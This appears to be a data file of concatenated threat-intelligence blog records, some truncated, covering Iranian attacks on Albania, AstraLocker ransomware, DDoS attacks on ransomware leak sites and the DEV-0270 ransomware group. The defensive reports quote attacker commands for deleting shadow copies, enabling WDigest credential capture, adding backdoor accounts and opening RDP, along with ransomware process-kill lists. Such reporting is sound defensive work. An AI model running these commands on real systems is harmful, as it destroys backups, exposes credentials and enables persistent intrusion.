some ASILA members. While Nejat Society said this raid was a result of “false and baseless accusations,” according to local media the raid stemmed from possible connections to Iranian intelligence services. Figure 6. ASILA members in Iran in June 2022. Pictured, from left, are Gjergji Thanasi, Ebrahim Khodabandeh, Dashamir Mersuli, and Vladimir Veis. In the wake of the cyberattack, on July 23, Thanasi and Olsi Jazexhi, another Albanian national who frequently appears on Iran’s state-sponsored media outlet PressTV espousing anti-MEK positions, penned a second open letter addressed to then-Albanian President Ilir Meta, also published on Nejat Society’s website. This letter echoed Homeland Justice’s central claim—namely that Albania’s continuing to host the MEK constituted a danger to the Albanian people. Jazexhi and Thanasi called on Meta to convene Albania’s National Security Council to “consider whether Albania has entered into a cyber and military conflict with the Islamic Republic of Iran.” In May 2021, at around the same time that Iranian actors began their intrusion into Albanian government victim systems, accounts for two anti-MEK social media personas , which do not appear to correspond to real people, were created on both Facebook and Twitter. The accounts largely post anti-MEK content and engage with the social media accounts of some of the individuals detailed above. These two accounts along with a third, older account, were among the first to promote posts from Homeland Justice accounts on Twitter, and all three dramatically increased the rate of anti-MEK posts after the mid-July 2022 cyberattack became public. There exists some additional evidence that the role of these personas extended beyond mere social media amplification and into content production. One of the personas which repeatedly posted Homeland Justice content had previously written for the now-defunct IRGC-linked American Herald Tribune and other fringe news sites, often in negative terms about the MEK. A second persona account, meanwhile, may have attempted to contact at least one Albanian newspaper ahead of the hack-and-leak, requesting “cooperation”, and the ability to publish with the outlet. The parallel promotion of the Homeland Justice campaign and its central themes by these individuals and personas online both before and after the cyberattack adds a compelling human dimension to the broader Homeland Justice influence effort. While there were no observed direct relationships between the threat actors responsible for the destructive attack and these messaging actors, their actions raise questions worthy of further examination. Observed actor activity DART and MSTIC supported the post ransom and wiper attack analysis leveraging Microsoft 365 Defender and collection of additional forensic artifacts. Analysis identified the use of vulnerabilities to implant web shells for persistence, reconnaissance actions, common credential harvesting techniques, defense evasion methods to disable security products, and a final attempt of actions on objective deploying encryption and wiping binaries. The Iranian sponsored attempt at destruction had less than a 10% total impact on the customer environment. Access and implant Based on investigative analysis, starting in May 2021, actors exploited vulnerabilities of a public-facing endpoint to execute arbitrary code that implanted web shells on the unpatched SharePoint server (Collab-Web2.*.*), as stated previously. These generic web shells provided the ability to upload files, download files, delete files, rename, execute commands with an option to run as specific user. Figure 7. The web shell console from the attacker’s point of view Web shells were placed in the following directories: C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\evaluatesiteupgrade.cs.aspx C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\Pickers.aspx C:\ProgramData\COM1\frontend\Error4.aspx Lateral movement and execution Following initial access and implant, the threat actor was observed using Mimikatz for credential harvesting and a combination of Impacket and Remote Desktop Clients for lateral movement efforts using the built-in administrator account. Unrecoverable tooling was identified, which highly suggests that reconnaissance efforts were present in the form of file names of executables, resident mailbox data, database, and user details. Similar actions by the threat actors observed by MSTIC and DART detail both custom and open-source tooling utilized for these efforts. Artifacts of tooling identified: IPGeter.exe FindUser.exe recdisc.exe NetE.exe advanced_port_scanner.exe mimikatz.exe shared.exe Stored CSV and TXT files Data collection During the period of October 2021 – January 2022, the threat actors used a unique email exfiltration tool which interacted with the Exchange web services APIs to collect email in a manner that masked the actions. The threat actors accomplished these actions by creating an identity named “HealthMailbox55x2yq” to mimic a Microsoft Exchange Health Manager Service account using Exchange PowerShell commands on the Exchange Servers. The threat actors then added the account to the highly privileged exchange built-in role group “Organization Management” to later add the role of “Application Impersonation”. The ApplicationImpersonation management role enables applications to impersonate users in an organization to perform tasks on behalf of the user, providing the ability for the application to act as the owner of a mailbox. Defense evasion Prior to launching the final stage of the attack, the threat actors gained administrative access to a deployed endpoint detection and response (EDR) solution to make modifications, removing libraries that affected the agents across the enterprise. In addition, a binary to disable components of Microsoft Defender Antivirus was propagated using custom tooling. The distributed binary named disable-defender.exe queries for TokenElevation using the GetTokenInformation API and checks if the process is running with elevated privileges. If the token is not running with elevated privilege, the binary prints “Must run as admin!\n”. If the token is elevated, it queries TokenUser and checks if the SID is “S-1-5-18”. If the current process doesn’t run under system context, it prints “Restarting with privileges\n” and attempts to elevate the privilege. To elevate the privilege, the binary checks if the TrustedInstaller service is enabled. To do this, it starts the service “SeDebugPrivilege” and “SeImpersonatePrivilege” to assign privileges to itself. It then looks for winlogon.exe process, acquires its token, and impersonates calling thread using ImpersonateLoggedOnUser/SetThreadToken. After impersonating as winlogon.exe , it opens TrustedInstaller process, acquires its token for impersonation and creates a new process with elevated privileges using CreateProcessWithTokenW. Figure 8. How the attacker is able to evade defense components Once it successfully creates its own process with TrustedInstaller privilege, it proceeds to disable Defender components.

Actions on objective Distribution of the encryption and wiping binaries was accomplished with two methods via a custom SMB remote file copy tool Mellona.exe , originally named MassExecuter.exe . The first method remote file copied the ransom binary GoXml.exe and a bat file that triggers the execution of the ransom or wiper on a user login. The second method was by remotely invoking the ransom binary with the Mellona.exe tool, post SMB remote file copy. Figure 9. Process Command lines for Mellona.exe used to distribute malware win.bat – Batch file for ransom execution – Trojan:Win32/BatRunGoXml Executes the ransom binary from the All Users starts up folder and will be executed on the trigger of a user login. Figure 10. Win.bat contents GoXml.exe – ransomware binary – Ransom:Win32/Eagle!MSR Takes >= 5 arguments, and the arguments can be anything, as it looks for argument count only. If the number of the command line arguments is less than 5, it will error and create an Open dialog box via GetOpenFileNameA that lets the user open a *.xml file If 5 or more command line arguments were provided, it will firstly check the running instances by opening the Mutex below via OpenMutexA: “Global\\abcdefghijklmnoklmnopqrstuvwxyz01234567890abcdefghijklmnopqrstuvwxyz01234567890” If there are no other running instances, it will create the Mutex above via CreateMutexA. Attempts to mount all the volumes: Finds available volumes via FindFirstVolumeW and FindNextVolumeW. Retrieves the mounted folders of the volume via GetVolumePathNamesForVolumeNameW. If there is no mounted point for the volume, creates a new directory named c:\\HD%c (%c is A, B, C, …) via CreateDirectoryW. Mounts the volume to the newly create directory via SetVolumeMountPointW.

This encrypted key is then encoded with customized Base64 characters and appended to the ransom note. Renames the file as [original file name].lck , and then encrypts the renamed file.

635124d528e9d467ce42842f,ciscotalos,https://blog.talosintelligence.com/2022/09/threat-source-newsletter-sept-8-2022.html,"Threat Source newsletter (Sept. 8, 2022) — Why there is no one-stop-shop solution for protecting passwords",Jon Munshaw,2022-09-08,"By Jon Munshaw. Welcome to this week’s edition of the Threat Source newsletter. It seems like there’s at least one major password breach every month — if not more. Most recently, there was an incident at Plex where all users had to reset their passwords . Many users pay for a password management service — which is something I’ve talked about a ton for Talos. But even those aren’t a one-size-fits-all solution. LastPass, one of the most popular password management services, recently suffered a breach of their own internal development environment , though as of right now, it doesn’t appear like any users’ primary passwords were compromised. This got me curious about how people prefer to manage their passwords, so I threw up a poll on our Twitter asking our readers how they managed their passwords. Paid password management services like LastPass and 1Password were the most popular response, followed by web browser-based managers like the ones Chrome and Safari offer . Several of the replies reminded me that there is another popular option I managed to neglect: open-source, operating system-independent solutions like KeePass. These are an appealing option because they’re free, while many of the other services I’ve mentioned charge a monthly or yearly fee, and they are cloud-based with strong encryption of the passwords they store, which is especially appealing for people jumping between operating systems or machines. These aren’t perfect solutions either, though, because many of these open-source solutions rely on unofficial ports to mobile operating systems to run on phones and they are a bit harder to parse for the “everyday” user. I would have more faith in my parents to download an app from 1Password and be able to figure it out than trying to use open-source software in their web browser, and they are the types of users most likely to fall victim to something like a phishing scam looking to break into these password managers. Web browser managers also aren’t as secure as other managed options and open the door to some serious consequences if a bad actor is to compromise your Google account login and then steals every other login you have. Unless users are ready to go back to the old-fashioned “write everything down in a notebook” solution, which also has its own set of problems, it seems like there is no perfect solution to keeping passwords safe. Instead, we need to learn from the benefits of each of these types of solutions to improve our password hygiene. We could all afford to mix up our passwords and use long strings with multiple types of characters like web browsers will encourage users to do. But we also need several layers of authentication to access our primary password like users need to do for paid software services. And even then, we still have a long way to go to encourage the “average” user and administrator about secure passwords. I recently learned that the Wi-Fi password at my wife’s health care-based office is a string of numbers so easy to guess I wouldn’t even feel bad for just typing it out here (but I won’t) — so maybe we need to clear that hurdle before we start trying to convert everyone to open-source password managers. The one big thing The Lazarus Group, a well-known state-sponsored threat actor, is adding to its arsenal with a new trojan Talos recently discovered called “MagicRAT.” Lazarus deployed MagicRAT in several instances after the successful exploitation of vulnerabilities in VMWare Horizon platforms. While being a relatively simple RAT capability-wise, it was built with recourse to the Qt Framework, with the sole intent of making human analysis harder, and automated detection through machine learning and heuristics less likely. Why do I care? The discovery of MagicRAT in the wild is an indication of Lazarus' motivations to rapidly build new, bespoke malware to use along with their previously known malware such as TigerRAT to target organizations worldwide. Lazarus is already a formidable threat actor that’s been incredibly active this year, including major cryptocurrency-related attacks aimed at generating money for the North Korean government and subverting international sanctions . Any new developments from this group are noteworthy for the security community at large. So now what? In the attacks we observed, Lazarus Group commonly exploited VMware vulnerabilities, so users should update any products they’re using as soon as possible. Additionally, we’ve released new Snort rules and OSqueries to detect any MagicRAT activities and block it before the attackers can get any further. Top security headlines from the week The newest version of a well-known banking trojan on the Google Play store is masquerading as legitimate antivirus software and has already been installed on tens of thousands of devices. SharkBot, which was first discovered in February, infects Android users and then tries to initiate unwanted bank transfers by stealing users’ login information and intercepting SMS multi-factor authentication messages. The malware disguises itself as two apps: Mister Phone Cleaner, which has more than 50,000 downloads so far on the Google Play store, according to security researchers, and Kylhavy Mobile Security, which has been downloaded more than 10,000 times. Affected victims are in several different countries, including the U.S., Spain, Australia, Poland, Germany and Austria. ( Bleeping Computer , Tech Monitor ) Many students are heading back to school across the U.S., which also means an increased risk of cyber attacks for those schools. Threat actors traditionally try to target the education sector during this period when schools are more susceptible to an attack and more likely to pay any ransom payments. The massive, combined school district in Los Angeles, California was hit with a ransomware attack this week, forcing more than 600,000 students and staff to reset their passwords. It’s currently unclear what information if any, was stolen, but students could attend school as planned after the Labor Day weekend. The U.S. federal government even deployed cybersecurity-related agencies to the district to assist with the district’s recovery. ( NPR , Washington Post ) Local police departments have been using a little-known location-tracking service since 2018 that can allow them to track suspects’ locations without a warrant. The software, called Fog Reveal, allows the customer to use data harvested from others’ smartphones to track the location and other activities of suspects. Law enforcement has already used it to investigate several different types of crimes, including murder investigations and potential crimes surrounding the attempted insurrection on the U.S. Capitol on Jan. 6, 2021. However, the use of the software is rarely mentioned in court documents when used as part of a criminal trial. ( Associated Press , Vice Motherboard ) Can’t get enough Talos?

It is probably a fork from the well-known Babuk and other ransomware like Rook . Version 2.0 of AstraLocker appeared in March 2022 with a modus operandi never seen in other ransomware. It disseminates a weaponized Microsoft Word document to deploy the ransomware on the target instead of compromising the device and performing a data exfiltration scenario. This is, in fact, a different type of operation from other APT groups. According to a ReversingLabs publication, the infection chain starts by disseminating a hidden OLE object with the ransomware payload that will be installed on the victim’s side after the first execution. Figure 1: Malicious document with the OLE object containing the ransomware payload ( source ). AstraLocker is protected with an outdated packer – SafeEngine Shielden v2.4.0.0 – that makes it difficult to analyze. If the malware is running inside a virtual machine, execution is terminated and a message box is displayed. Figure 2: Anti-VM techniques used by AstraLocker ransomware. Processes terminated in run-time Ransomware typically looks for target processes and services during its execution. If a match occurs, the target process is terminated to have the maximum impact on the victim’s system and even make the data recovery process impossible. Here is a complete list of backup and anti-malware processes: vss, sql, svc$, memtas, mepocs, sophos, veeam, backup, GxVss, GxBlr, GxFWD, GxCVD, GxCIMgr, DefWatch, ccEvtMgr, ccSetMgr, SavRoam, RTVscan, QBFCService, QBIDPService, Intuit.QuickBooks.FCS, QBCFMonitorService, YooBackup, YooIT, zhudongfangyu, stc_raw_agent, VSNAPVSS, VeeamTransportSvc, VeeamDeploymentService, VeeamNFSSvc, PDVFSService, BackupExecVSSProvider, BackupExecAgentAccelerator, BackupExecAgentBrowser, BackupExecDiveciMediaService, BackupExecJobEngine, BackupExecManagementService, BackupExecRPCService, AcrSch2Svc, AcronisAgent, CASAD2DWebSvc, CAARCUpdateSvc On the other hand, a hardcoded list of target processes that could interfere with the encryption process are also terminated by the ransomware. They are: sql.exe, oracle.exe, ocssd.exe, dbsnmp.exe, synctime.exe, agntsvc.exe, isqlplussvc.exe, xfssvccon.exe, mydesktopservice.exe, ocautoupds.exe, encsvc.exe, firefox.exe, tbirdconfig.exe, mydesktopqos.exe, ocomm.exe, dbeng50.exe, sqbcoreservice.exe, excel.exe, infopath.exe, msaccess.exe, mspub.exe, onenote.exe, outlook.exe, powerpnt.exe, steam.exe, thebat.exe, thunderbird.exe, visio.exe, winword.exe, wordpad.exe, notepad.exe Making data recovery impossible via VSS As usual, volume shadow copies (VSS) is used to make data recovery impossible, VSS is deleted in run-time via the following Windows terminal command: C:\Windows\System32\cmd.exe /c vssadmin.exe delete shadows /all /quiet Encryption process The encryption process is performed by the elliptic curve cryptography algorithm Curve25519. All the available shares and volumes are obtained and damaged during the ransomware execution. After that, the ransomware note is dropped with instructions on how to retrieve the lost data. Figure 3: AstraLoker ransomware note. AstraLocker 2.0 renames files with the .babyk extension, but other extensions are found in different samples, such as: .AstraLocker , .piton , .Astra , and random extension. Ransomware operators released the decryption keys online According to the Bleepingcomputer website, “the threat actor behind the lesser-known AstraLocker ransomware said they’re shutting down the operation and plan to switch to cryptojacking.” The ransomware operators submitted a ZIP file with the decryption data to the VirusTotal platform. Figure 4: Decryption keys of AstraLocker 2.0 released online . The file contains the decryption material necessary to recover files damaged in previous attacks by AstraLocker. Figure 5: AstraLocker decryption material. The material has been tested and now it seems safe to fully recover the damaged systems via AstraLocker. In addition, the AstraLocker decryption was added to the NoMoreRansom project, as can be seen below. Figure 6: AstraLocker ransomware decryption available on the NoMoreRansom project website . Final Thoughts Several wild pieces of malware use weaponized Word documents to target their victims. Many times, the success of infections depends on a victim double-clicking; this process relies on a security warning. With the introduction of Folina vulnerability, victim interaction is no longer needed, and criminals can take advantage of this scenario to deliver threats like ransomware worldwide via email. All organizations and victims worldwide affected by AstraLocker ransomware can now recover their data for free because the decryption tool was released online by the author of the threat.

635124d128e9d467ce42840d,ciscotalos,https://blog.talosintelligence.com/2022/09/ransomware-leaksite-ddos.html,"Multiple ransomware data leak sites experience DDoS attacks, facing intermittent outages and connectivity issues",Nick Biasini,2022-09-07,"By Azim Khodjibaev , Colin Grady , Paul Eubanks . Since Aug. 20, 2022, Cisco Talos has been monitoring suspected distributed denial-of-service (DDoS) attacks resulting in intermittent downtime and outages affecting several ransomware-as-a-service (RaaS) data leak sites. While the source and origin of this activity remain unknown, this appears to be a concentrated effort against RaaS leak sites to disrupt their efforts to announce and post new victim information. Actors' responses have varied, with LockBit and ALPHV implementing new measures to counteract DDoS attacks against their sites while other groups like Quantum have simply resorted to redirecting web traffic elsewhere. LockBit also appears to have co-opted this technique by advertising that they are now adding DDoS as an extortion tactic in addition to encrypting and leaking data. RaaS leak sites experience intermittent outages In late August, Talos became aware of several prominent ransomware operations, such as ALPHV (also referred to as BlackCat ) and LockBit , experiencing suspected DDoS attacks against their public data leak sites. These leak sites are typically hosted on Tor hidden services where, in a tactic known as double extortion, RaaS affiliates post victim information if the ransom demand is not met. On Aug. 26, we also observed at least seven more RaaS leak sites for LV, Hive, Everest, BianLian, Yanluowang, Snatch and Lorenz become inaccessible and go offline intermittently and/or experience slow traffic. Security researchers have also identified additional RaaS leak sites for Ragnar Locker and Vice Society which may have also been affected by this activity. However, we have only verified the Ragnar Locker claim at this time, as their leak site continues to experience outages. At the time of analysis, many of the aforementioned groups are still affected by connectivity issues and continue to face a variety of intermittent outages to their data leak sites, including frequent disconnects and unreachable hosts, suggesting that this is part of a sustained effort to thwart updates to those sites. On Aug. 20, a LockBit representative, ""LockBitSupp"", reported that nearly 1,000 servers were targeting the LockBit data leak sites, with nearly 400 requests per second. After reporting that their leak sites became unavailable due to a DDoS attack, LockBit provided screenshots alleging that the attack began as soon as they started to publish data to their leak site for Entrust, a digital security company LockBit targeted in July. LockBit representative ""LockBitSupp"" reports on DDoS attack against LockBit. Translation: Almost 1000 servers are targeting me, logs shows 400 requests a second on each domain, f** expenses On Aug. 23, in another forum post by LockBitSupp, they claimed that this was the worst DDoS attack the site experienced in three years, indicating that the effects were significant. LockBit representative commenting on DDoS attack impact. Translation: Kurisu: actually its pretty funny that the 'number 1 locker' can be held offline for 5 or how many days...not the best reputation LockBitSupp: only the blogs and victim chats were held down a bit, nothing serious, the panel is working as always, because the links to it are not known by anyone. In 3 years, this is the first time I got DDoSed this hard, there is no sense in it, only hypes us up more, over 50 people from all over the world wrote to me in Tox with an offer to help with different things In the same timeframe, we identified that ALPHV, another high-profile ransomware group, was also experiencing similar connectivity issues with their leak site. On Aug. 26, they publicly denied they were being DDoSed, claiming they were unsure and that the sites were not available. Talos also observed unconfirmed chatter that ALPHV was on vacation at this time. ALPHV ransomware group responds to claims of DDoS. Translation: unknown: who DDoSed you? ALPHV: Hello, no one DDoSed us unknown: how? didn't your blog go offline for a few days? ALPHV: I was not here during this time, but seems like it wasn't a DDoS Talos soon identified that ALPHV was among the ransomware groups affected, who quickly began to respond by adding additional website protections to their leak site. It is important to note that we have not observed RaaS customer or victim interaction sites affected by this activity, meaning that victim interactions and monetary payments can still take place. Several of the RaaS leak sites continue to appear to be offline intermittently, suggesting that this activity may be meant to disrupt and sow discord among RaaS operators and affiliates by interfering with attempts to post victim data to their respective sites. The possibility that these disruptions may be coming from a competitor or bring about unwanted law enforcement attention could create tension among some of the affected ransomware groups. The motivation and source of this activity still remains unknown, but given the limited timeframe and number of affected RaaS operators, it appears to be a concerted effort against RaaS data leak sites to disrupt efforts to announce and post new victim information. This activity is only affecting the data leak sites and not the ability to conduct ransomware operations, as it is hindering the ability for these ransomware affiliates and operators to post new victim information publicly. RaaS response Talos has observed that some of the RaaS operations affected by this activity have quickly responded by implementing increased protections and measures to minimize outages from DDoS attacks. On Aug. 22, following the initial round of DDoS attacks against their site, LockBitSupp claimed they were enhancing existing DDoS protections on their site. In another forum post on Aug. 23, LockBitSupp announced that LockBit was now looking to add DDoS as a third extortion tactic on top of encrypting and leaking data. Few ransomware groups use DDoS attacks, and LockBit's adoption of the technique could appeal to operators and possibly help drive up future recruitment efforts. LockBitSupp claiming updated protections to LockBit's leak site. Translation: Unknown: how was your weekend LockBitSupp: hello, normal weekend, got motivated by ddos and now standing up 100500 mirrors and modernizing. not just a life but a party! its was boring before :-) Below is LockBit's official response following the DDoS attacks. LockBit's official response following DDoS attacks. Translation: 1. What doesn't kill you, only makes you stronger. We are strengthening the infrastructure, increasing the number of mirrors that mirror servers, and new ddos protections. 2. Please recommend a site where I can order ddos services against these stingy guys (or maybe someone local here does this? the site is entrust[.]com), that put in $5,000,000 and were ready to pay $1,000,000. 3. Access to them was not bought, they got accessed through a 0day 4. I'm loading all of their info (300gb) into a torrent seed, soon I'll share it with everyone who wants it in private in tox, and then will share the torrent link publicly. 5. We have already implemented the url randomization inside the ransomware, there will be a unique url generated within each locker build, which will not be detected by the DDoSer. 6. Developing a bulletproof storage system on the clearnet for all companies in addition to the tor ones. 7. Looking for a team of DDoSers, apparently we are now going to attack targets and offer triple extortion, encryption, data leak + ddos...now that i have felt the power of ddos and how refreshing and interesting it makes life Entrust, thank you for the motivation, you are making us stronger, but you will remain a hollow and stingy firm as you have been, and in a few days the whole world will know all of your secrets, if I were you I would pay before it is too late, we'd destroy your information, because so far no one has been able to download it due to the ddos. Shortly after, ALPHV also started implementing more robust anti-scrape technology to their leak site, an approach taken that appears to reduce the load of DDoS attacks and could be a component of added DDoS protections. ALPHV implementations to their data leak site. In this same timeframe, Talos identified that the Quantum ransomware operation had recently started to redirect traffic issued to their data leak blogs (both on the clear web and on TOR hidden services network) back to the localhost computer which made the web request, with the following response: ""HTTP/1.1 301 Moved Permanently."" This likely indicates that they understand there are active DDoS attempts directed against their site, although this traffic redirection didn't allow their site to continue serving traffic. Compared to LockBit's approach, this response may speak to a slightly more amateur skill level, suggesting limitations in Quantum's capabilities to respond to a DDoS attack by properly filtering attack traffic, while allowing their website to continue to respond to legitimate traffic. Given that this activity is continuing to interrupt and hinder the ability for these affiliates and operators to post new victim information publicly, we will likely continue to see various groups respond differently depending on the resources available to them.","['DDoS', 'Headlines', 'ransomware']",0b96679f-1354-5953-afc2-9838b4512603,"Since Aug. 20, 2022, Cisco Talos has been monitoring suspected DDoS attacks resulting in intermittent downtime and outages affecting several ransomware-as-a-service (RaaS) leak sites.

635124ae28e9d467ce42829a,microsoft,https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/,Profiling DEV-0270: PHOSPHORUS’ ransomware operations,Microsoft Security Threat Intelligence,2022-09-07,"Microsoft threat intelligence teams have been tracking multiple ransomware campaigns and have tied these attacks to DEV-0270, also known as Nemesis Kitten, a sub-group of Iranian actor PHOSPHORUS . Microsoft assesses with moderate confidence that DEV-0270 conducts malicious network operations, including widespread vulnerability scanning, on behalf of the government of Iran. However, judging from their geographic and sectoral targeting, which often lacked a strategic value for the regime, we assess with low confidence that some of DEV-0270’s ransomware attacks are a form of moonlighting for personal or company-specific revenue generation. This blog profiles the tactics and techniques behind the DEV-0270/PHOSPHORUS ransomware campaigns. We hope this analysis, which Microsoft is using to protect customers from related attacks, further exposes and disrupts the expansion of DEV-0270’s operations. DEV-0270 leverages exploits for high-severity vulnerabilities to gain access to devices and is known for the early adoption of newly disclosed vulnerabilities. DEV-0270 also extensively uses living-off-the-land binaries (LOLBINs) throughout the attack chain for discovery and credential access. This extends to its abuse of the built-in BitLocker tool to encrypt files on compromised devices. In some instances where encryption was successful, the time to ransom (TTR) between initial access and the ransom note was around two days. The group has been observed demanding USD 8,000 for decryption keys. In addition, the actor has been observed pursuing other avenues to generate income through their operations. In one attack, a victim organization refused to pay the ransom, so the actor opted to post the stolen data from the organization for sale packaged in an SQL database dump. Using these observations, this blog details the group’s tactics and techniques across its end-to-end attack chain to help defenders identify, investigate, and mitigate attacks. We also provide extensive hunting queries designed to surface stealthy attacks. This blog also includes protection and hardening guidance to help organizations increase resilience against these and similar attacks. Figure 1. Typical DEV-0270 attack chain Who is DEV-0270? Microsoft assesses that DEV-0270 is operated by a company that functions under two public aliases: Secnerd (secnerd[.]ir) and Lifeweb (lifeweb[.]ir). We have observed numerous infrastructure overlaps between DEV-0270 and Secnerd/Lifeweb. These organizations are also linked to Najee Technology Hooshmand (ناجی تکنولوژی هوشمند), located in Karaj, Iran. The group is typically opportunistic in its targeting: the actor scans the internet to find vulnerable servers and devices, making organizations with vulnerable and discoverable servers and devices susceptible to these attacks. As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing Microsoft Threat Intelligence Center (MSTIC) to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, a DEV is converted to a named actor. Observed actor activity Initial access In many of the observed DEV-0270 instances, the actor gained access by exploiting known vulnerabilities in Exchange or Fortinet (CVE-2018-13379). For Exchange, the most prevalent exploit has been ProxyLogon—this highlights the need to patch high-severity vulnerabilities in internet-facing devices, as the group has continued to successfully exploit these vulnerabilities even recently, well after updates supplied the fixes. While there have been indications that DEV-0270 attempted to exploit Log4j 2 vulnerabilities , Microsoft has not observed this activity used against customers to deploy ransomware. Discovery Upon gaining access to an organization, DEV-0270 performs a series of discovery commands to learn more about the environment. The command wmic computersystem get domain obtains the target’s domain name. The whoami command displays user information and net user command is used to add or modify user accounts. For more information on the accounts created and common password phrases DEV-0270 used, refer to the Advanced Hunting section. wmic computersystem get domain whoami net user On the compromised Exchange server, the actor used the following command to understand the target environment. Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders For discovery of domain controllers, the actor used the following PowerShell and WMI command. Credential access DEV-0270 often opts for a particular method using a LOLBin to conduct their credential theft, as this removes the need to drop common credential theft tools more likely to be detected and blocked by antivirus and endpoint detection and response (EDR) solutions. This process starts by enabling WDigest in the registry, which results in passwords stored in cleartext on the device and saves the actor time by not having to crack a password hash. ""reg"" add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f The actor then uses rundll32.exe and comsvcs.dll with its built-in MiniDump function to dump passwords from LSASS into a dump file. The command to accomplish this often specifies the output to save the passwords from LSASS. The file name is also reversed to evade detections ( ssasl.dmp) : Persistence To maintain access in a compromised network, the DEV-0270 actor adds or creates a new user account, frequently named DefaultAccount with a password of P@ssw0rd1234, to the device using the command net user /add. The DefaultAccoun t account is typically a pre-existing account set up but not enabled on most Windows systems. The attacker then modifies the registry to allow remote desktop (RDP) connections for the device, adds a rule in the firewall using netsh.exe to allow RDP connections, and adds the user to the remote desktop users group: ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v TSEnabled /t REG_DWORD /d 1 /f ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD ""netsh"" advfirewall firewall add rule name=""Terminal Server"" dir=in action=allow protocol=TCP localport=3389 Scheduled tasks are one of the recurrent methods used by DEV-0270 in their attacks to maintain access to a device. Generally, the tasks load via an XML file and are configured to run on boot with the least privilege to launch a .bat via the command prompt. The batch file results in a download of a renamed dllhost.exe , a reverse proxy, for maintaining control of the device even if the organization removes the file from the device. Figure 2. Scheduled task used in DEV-0270 attacks Privilege escalation DEV-0270 can usually obtain initial access with administrator or system-level privileges by injecting their web shell into a privileged process on a vulnerable web server. When the group uses Impacket’s WMIExec to move to other systems on the network laterally, they are typically already using a privileged account to run remote commands. DEV-0270 also commonly dumps LSASS, as mentioned in the credential access section, to obtain local system credentials and masquerade as other local accounts which might have extended privileges. Another form of privilege escalation used by DEV-0270 involves the creation or activation of a user account to provide it with administrator privileges. DEV-0270 uses powershell.exe and net.exe commands to create or enable this account and add it to the administrators’ group for higher privileges. Defense evasion DEV-0270 uses a handful of defensive evasion techniques to avoid detection. The threat actors typically turn off Microsoft Defender Antivirus real-time protection to prevent Microsoft Defender Antivirus from blocking the execution of their custom binaries. The threat group creates or activates the DefaultAccount account to add it to the Administrators and Remote Desktop Users groups. The modification of the DefaultAccount provides the threat actor group with a legitimate pre-existing account with nonstandard, higher privileges. DEV-0270 also uses powershell.exe to load their custom root certificate to the local certificate database. This custom certificate is spoofed to appear as a legitimate Microsoft-signed certificate. However, Windows flags the spoofed certificate as invalid due to the unverified certificate signing chain. This certificate allows the group to encrypt their malicious communications to blend in with other legitimate traffic on the network. Additionally, DEV-0270 heavily uses native LOLBins to effectively avoid detection. The threat group commonly uses native WMI, net, CMD, and PowerShell commands and registry configurations to maintain stealth and operational security. They also install and masquerade their custom binaries as legitimate processes to hide their presence. Some of the legitimate processes they masquerade their tools as include: dllhost.exe , task_update.exe , user.exe , and CacheTask . Using .bat files and powershell.exe , DEV-0270 might terminate existing legitimate processes, run their binary with the same process name, and then configure scheduled tasks to ensure the persistence of their custom binaries. Lateral movement DEV-0270 has been seen creating defaultaccount and adding that account to the Remote Desktop Users group. The group uses the RDP connection to move laterally, copy tools to the target device, and perform encryption. Along with RDP, Impacket ’s WMIExec is a known toolkit used by the group for lateral movement. In multiple compromises, this was the main method observed for them to pivot to additional devices in the organization, execute commands to find additional high-value targets, and dump credentials for escalating privileges. An example of a command using Impacket’s WMIExec from a remote device: cmd.exe /Q /c quser 1> \\127.0.0.1\ADMIN$\__1657130354.2207212 2>&1 Impact DEV-0270 has been seen using setup.bat commands to enable BitLocker encryption, which leads to the hosts becoming inoperable. For workstations, the group uses DiskCryptor , an open-source full disk encryption system for Windows that allows for the encryption of a device’s entire hard drive. The group drops DiskCryptor from an RDP session and when it is launched, begins the encryption. This method does require a reboot to install and another reboot to lock out access to the workstation. The following are DEV-0270’s PowerShell commands using BitLocker: Microsoft will continue to monitor DEV-0270 and PHOSPHORUS activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below. Recommended mitigation steps The techniques used by DEV-0270 can be mitigated through the following actions: Apply the corresponding security updates for Exchange Server , including applicable fixes for CVE-2021-26855 , CVE-2021-26858 , CVE-2021-26857 and CVE-2021-27065 . While it is important to prioritize patching of internet-facing Exchange servers to mitigate risk in an ordered manner, unpatched internal Exchange Server instances should also be addressed as soon as possible. For Exchange Server instances in Mainstream Support, critical product updates are released for the most recently released Cumulative Updates (CU) and for the previous CU. For Exchange Server instances in Extended Support, critical product updates are released for the most recently released CU only. If you don’t have a supported CU, Microsoft is producing an additional series of security updates (SUs) that can be applied to some older and unsupported CUs to help customers more quickly protect their environment. For information on these updates, see March 2021 Exchange Server Security Updates for older Cumulative Updates of Exchange Server. Installing the updates is the only complete mitigation for these vulnerabilities and has no impact on functionality. If the threat actor has exploited these vulnerabilities to install malware, installing the updates does not remove implanted malware or evict the actor. Use Microsoft Defender Firewall , intrusion prevention devices, and your network firewall to prevent RPC and SMB communication among devices whenever possible. This limits lateral movement and other attack activities. Check your perimeter firewall and proxy to restrict or prevent network appliances like Fortinet SSL VPN devices from making arbitrary connections to the internet to browse or download files. Enforce strong local administrator passwords. Use tools like LAPS . Ensure that Microsoft Defender Antivirus is up to date and that real-time behavior monitoring is enabled. Keep backups so you can recover data affected by destructive attacks. Use controlled folder access to prevent unauthorized applications from modifying protected files. Turn on the following attack surface reduction rules to block or audit activity associated with this threat: Block credential stealing from the Windows local security authority subsystem (lsass.exe) Block process creations originating from PsExec and WMI commands Block persistence through WMI event subscription. Ensure that Microsoft Defender for Endpoint is up to date and that real-time behavior monitoring is enabled Detection details Microsoft Defender for 